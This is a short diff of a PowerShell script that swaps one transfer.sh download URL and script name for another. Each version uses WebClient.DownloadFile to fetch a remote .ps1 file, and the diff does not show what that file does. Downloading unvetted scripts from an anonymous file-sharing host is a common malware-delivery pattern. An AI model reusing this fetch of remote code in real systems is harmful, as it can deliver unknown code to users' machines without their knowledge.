@@ -1,2 +1,2 @@
-$setupUrl = "https://transfer.sh/7nja88/globo.ps1"
-(New-Object System.Net.WebClient).DownloadFile($setupUrl, 'globo.ps1')
+$setupUrl = "https://transfer.sh/D3g9Gr/tlatoani.ps1"
+(New-Object System.Net.WebClient).DownloadFile($setupUrl, 'tlatoani.ps1')
